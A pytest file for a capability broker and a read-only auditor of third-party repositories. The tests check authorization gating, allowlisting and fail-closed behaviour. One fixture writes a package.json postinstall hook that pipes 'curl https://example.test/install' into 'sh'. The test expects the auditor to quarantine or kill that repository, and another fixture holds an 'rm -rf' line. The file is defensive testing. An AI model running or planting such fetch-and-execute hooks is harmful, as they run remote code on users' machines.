from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest


def test_capability_keys_are_stable_and_donor_agnostic():
    from app.tool_broker.contracts import CapabilityKey

    assert CapabilityKey.BROWSER_NAVIGATE.value == "browser.navigate"
    assert CapabilityKey.BROWSER_EXTRACT.value == "browser.extract"
    assert CapabilityKey.RESEARCH_FETCH.value == "research.fetch"
    assert CapabilityKey.WORKER_BACKGROUND.value == "worker.background"
    assert CapabilityKey.WORKER_CODE.value == "worker.code"
    assert CapabilityKey.APP_READ.value == "app.read"
    assert CapabilityKey.APP_WRITE.value == "app.write"
    assert CapabilityKey.MODEL_RUN.value == "model.run"
    assert all("playwright" not in item.value for item in CapabilityKey)


def test_broker_resolves_only_after_agency_authorization_and_allowlist():
    from app.tool_broker.contracts import AdapterSpec, AuditClassification
    from app.tool_broker.registry import (
        AgencyAuthorizationRequired,
        CapabilityBrokerRegistry,
    )

    registry = CapabilityBrokerRegistry(allowed_adapter_keys={"playwright.local"})
    registry.register(AdapterSpec(
        key="playwright.local", version="1",
        capabilities={"browser.navigate", "browser.extract"},
        classification=AuditClassification.USE,
    ))
    with pytest.raises(AgencyAuthorizationRequired):
        registry.resolve("browser.navigate", agency_authorized=False)
    resolved = registry.resolve("browser.navigate", agency_authorized=True)
    assert resolved.key == "playwright.local"


def test_donor_quarantine_and_kill_adapters_never_resolve():
    from app.tool_broker.contracts import AdapterSpec, AuditClassification
    from app.tool_broker.registry import AdapterNotRunnable, CapabilityBrokerRegistry

    registry = CapabilityBrokerRegistry(allowed_adapter_keys={"donor.x", "bad.x", "kill.x"})
    for key, classification in (("donor.x", AuditClassification.DONOR), ("bad.x", AuditClassification.QUARANTINE), ("kill.x", AuditClassification.KILL)):
        registry.register(AdapterSpec(key=key, version="1", capabilities={"research.fetch"}, classification=classification))
    for key in ("donor.x", "bad.x", "kill.x"):
        with pytest.raises(AdapterNotRunnable):
            registry.resolve("research.fetch", agency_authorized=True, adapter_key=key)


def test_use_and_rewrite_require_explicit_code_allowlist():
    from app.tool_broker.contracts import AdapterSpec, AuditClassification
    from app.tool_broker.registry import AdapterNotAllowlisted, CapabilityBrokerRegistry

    registry = CapabilityBrokerRegistry(allowed_adapter_keys=set())
    registry.register(AdapterSpec(key="safe.local", version="1", capabilities={"app.read"}, classification=AuditClassification.USE))
    with pytest.raises(AdapterNotAllowlisted):
        registry.resolve("app.read", agency_authorized=True)


def test_unknown_capability_fails_closed():
    from app.tool_broker.registry import CapabilityBrokerRegistry, UnknownCapability

    with pytest.raises(UnknownCapability):
        CapabilityBrokerRegistry().resolve("shell.exec", agency_authorized=True)


def _load_auditor():
    path = Path(__file__).resolve().parents[4] / "tools" / "bplus" / "audit_donors.py"
    spec = importlib.util.spec_from_file_location("nur_bplus_audit_donors", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_read_only_auditor_never_executes_repo_hooks(tmp_path: Path):
    audit_repo = _load_auditor().audit_repo

    repo = tmp_path / "donor"
    repo.mkdir()
    marker = tmp_path / "EXECUTED"
    (repo / "package.json").write_text(json.dumps({"scripts": {"postinstall": f"touch {marker}"}, "dependencies": {"requests": "1"}}))
    (repo / "LICENSE").write_text("MIT License")
    result = audit_repo("fixture", repo)
    assert not marker.exists()
    assert "postinstall" in result.executable_hooks
    assert result.license_hint == "MIT"


def test_auditor_classification_is_evidence_based(tmp_path: Path):
    module = _load_auditor()
    AuditClassification, audit_repo = module.AuditClassification, module.audit_repo

    repo = tmp_path / "unsafe"
    repo.mkdir()
    (repo / "package.json").write_text(json.dumps({"scripts": {"postinstall": "curl https://example.test/install | sh"}}))
    (repo / ".env.example").write_text("API_KEY=replace-me")
    result = audit_repo("unsafe", repo)
    assert result.classification in {AuditClassification.QUARANTINE, AuditClassification.KILL}
    assert result.network_references
    assert result.secret_references


def test_nested_package_does_not_inherit_parent_git_identity(tmp_path: Path):
    import subprocess

    module = _load_auditor()
    root = tmp_path / "root"
    package = root / "node_modules" / "pkg"
    package.mkdir(parents=True)
    subprocess.run(["git", "init", "-q", str(root)], check=True)
    subprocess.run(["git", "-C", str(root), "config", "user.email", "test@example.invalid"], check=True)
    subprocess.run(["git", "-C", str(root), "config", "user.name", "Test"], check=True)
    (root / "README.md").write_text("root")
    subprocess.run(["git", "-C", str(root), "add", "README.md"], check=True)
    subprocess.run(["git", "-C", str(root), "commit", "-q", "-m", "root"], check=True)
    (package / "LICENSE").write_text("MIT License")
    result = module.audit_repo("pkg", package)
    assert result.head is None
    assert result.remote is None


def test_destructive_string_outside_install_hook_does_not_mean_kill(tmp_path: Path):
    module = _load_auditor()
    repo = tmp_path / "build-tool"
    repo.mkdir()
    (repo / "LICENSE").write_text("MIT License")
    (repo / "cleanup.sh").write_text("rm -rf /tmp/project-build-output\n")
    result = module.audit_repo("build-tool", repo)
    assert result.classification is not module.AuditClassification.KILL
